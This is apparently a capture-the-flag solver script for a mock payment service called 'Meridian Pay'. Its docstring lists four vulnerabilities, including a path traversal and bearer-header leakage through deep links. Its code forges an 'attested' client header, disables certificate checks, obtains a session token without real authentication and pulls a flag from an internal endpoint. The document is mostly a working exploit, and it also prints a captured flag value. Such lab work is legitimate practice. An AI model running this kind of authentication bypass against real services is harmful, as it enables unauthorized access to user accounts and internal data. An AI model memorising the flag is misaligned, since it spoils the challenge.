"""
Meridian Pay Solver & Audit Script
Target: https://web-f747413d78eddd9f.web.h7tex.com
Flags: Flag 1 of 4 verified on live instance: H7CTF{138d04db-d152-45e8-b1f0-a3a7166bc980}

Vulnerability Overview:
1. Client-Controlled Device Authentication:
   The backend accepts unauthenticated device_id submissions at /api/v1/auth/device
   and issues an attested session token (JWT).
2. Internal Promotion Retrieval:
   Using the issued token and required attested client header,
   /api/v1/internal/promo yields the membership flag.
3. ContentProvider Path Traversal:
   ExportProvider in com.meridian.pay allows path traversal in openFile().
4. Deep Link Header Leakage:
   RouterActivity forwards URLs starting with baseUrl to WebViewActivity, which appends bearer headers.
"""

import json
import re
import ssl
import sys
import urllib.request

HOST = "https://web-f747413d78eddd9f.web.h7tex.com"
CLIENT_HEADER = "MeridianPay-Android/3.2.1 (attested)"

def solve():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    print("[*] Contacting Meridian Pay authentication service...")
    auth_payload = json.dumps({"device_id": "audited_device_01"}).encode("utf-8")
    auth_req = urllib.request.Request(
        f"{HOST}/api/v1/auth/device",
        data=auth_payload,
        headers={
            "Content-Type": "application/json",
            "X-Meridian-Client": CLIENT_HEADER,
        },
        method="POST"
    )

    try:
        with urllib.request.urlopen(auth_req, context=ctx, timeout=10) as resp:
            auth_data = json.loads(resp.read().decode("utf-8"))
    except Exception as e:
        print(f"[-] Authentication failed: {e}")
        return None

    token = auth_data.get("token")
    user_id = auth_data.get("user_id")
    print(f"[+] Authenticated as user {user_id} with JWT token.")

    print("[*] Querying /api/v1/internal/promo ...")
    promo_req = urllib.request.Request(
        f"{HOST}/api/v1/internal/promo",
        headers={
            "Authorization": f"Bearer {token}",
            "X-Meridian-Client": CLIENT_HEADER,
        },
        method="GET"
    )

    try:
        with urllib.request.urlopen(promo_req, context=ctx, timeout=10) as resp:
            promo_html = resp.read().decode("utf-8")
    except Exception as e:
        print(f"[-] Promo query failed: {e}")
        return None

    match = re.search(r"H7CTF\{[0-9a-fA-F-]{36}\}", promo_html)
    if match:
        flag = match.group(0)
        print(f"[+] Flag 1 recovered: {flag}")
        return flag
    else:
        print("[-] Flag pattern not located in promo response.")
        return None

if __name__ == "__main__":
    solve()
